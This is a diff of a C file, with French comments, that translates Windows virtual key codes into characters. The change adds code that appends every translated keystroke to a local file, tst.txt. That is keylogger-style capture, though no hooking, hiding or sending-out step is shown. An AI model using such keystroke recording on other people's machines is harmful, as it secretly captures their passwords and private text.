@@ -3,7 +3,7 @@
 
 keyboard_status kb_status;
 
-keyboard_status init_kb_status(int key_value)
+void init_kb_status(int key_value)
 {
 	kb_status.verr_maj	= GetKeyState(VK_CAPITAL);
 	kb_status.verr_num	= GetKeyState(VK_NUMLOCK);
@@ -24,42 +24,38 @@ keyboard_status init_kb_status(int key_value)
 	else
 		kb_status.alt_gr = 0; 
 	// ---------------------------
-	return (kb_status);
 }
 
-short zone(int key_value)
+short key_zone(int key_value)
 {
-	if (key_value >= 65 && key_value <= 90) // lettres
+	if (key_value >= 65 && key_value <= 90)			// lettres
 		return (1); // 1		
-	else if (key_value >= 96 && key_value <= 111 ) // nums pad
+
+	else if (key_value >= 96 && key_value <= 111)	// nums pad
 		return (2); // 2
-	else if (key_value >= 48 && key_value <= 57) // nums
+
+	else if (key_value == 186 || key_value == 187 || key_value == 188 || key_value == 190 // spéciaux
+			|| key_value == 191 || key_value == 192 || key_value == 219 || key_value == 220
+			|| key_value == 221 || key_value == 223 || key_value == 226)
 		return (3); // 3
-	else if (key_value == 186 || key_value == 187 || key_value == 188 || key_value == 190 
-		|| key_value == 191 || key_value == 192 || key_value == 219 || key_value == 220 
-		|| key_value == 221	|| key_value == 223 || key_value == 226)
+
+	else if (key_value >= 48 && key_value <= 57) // nums top
 		return (4); // 4
-	else if (key_value == 13 || key_value == 8)  // entrer  supp
+	else if (key_value == 13 || key_value == 8)		// entrer  supp
 		return (5); // 5 
-	else if (key_value == 192) // ²
+	else if (key_value == 192 || key_value == 32)	//  ²   space 
 		return (6); // 6
 	else
-	{
-		printf(" unsigned "); // xxxxxxxxxxxxxxxx a supprimer
 		return (0);
-	}
 }
 
-unsigned char translate_key_value(int key_value)
+
+
+short translate_key_value(int key_value)
 {
 	init_kb_status(key_value);
-	if (kb_status.ctrl != 1 && kb_status.ctrl != 0)
-		return (0);
 	switch (kb_status.zone)
 	{
-	case 0 :
-		return (0);
-		break;
 	case 1 :
 		return (zone1(key_value, kb_status)); 
 		break;
@@ -70,28 +66,36 @@ unsigned char translate_key_value(int key_value)
 		return (zone3(key_value, kb_status));
 		break;
 	case 4 :
-		return (zone3(key_value, kb_status));
-		break;
-	case 5 :
 		return (zone4(key_value, kb_status));
 		break;
-	case 6 :
+	case 5 :
 		return (zone5(key_value, kb_status));
+		break;
+	case 6 :
+		return (zone6(key_value, kb_status));
+		break;
+	default :
+		return (0);
 		break;
 	}
 }
 
 void analyse_keyboard_status(int key_value)
-{
+{ 
 	unsigned char charactere;
+	FILE *fichier;
 
 	charactere = 0;
 	charactere = translate_key_value(key_value);
+	//charactere = 173;
 	if (charactere)
+	{
 		printf("%c", charactere);
+		fichier = fopen("tst.txt", "a+");
+		if (fichier != NULL)
+		{
+			fwprintf(fichier, L"%lc", charactere);
+			fclose(fichier);
+		}
+	}
 }
-
-
-
-
-
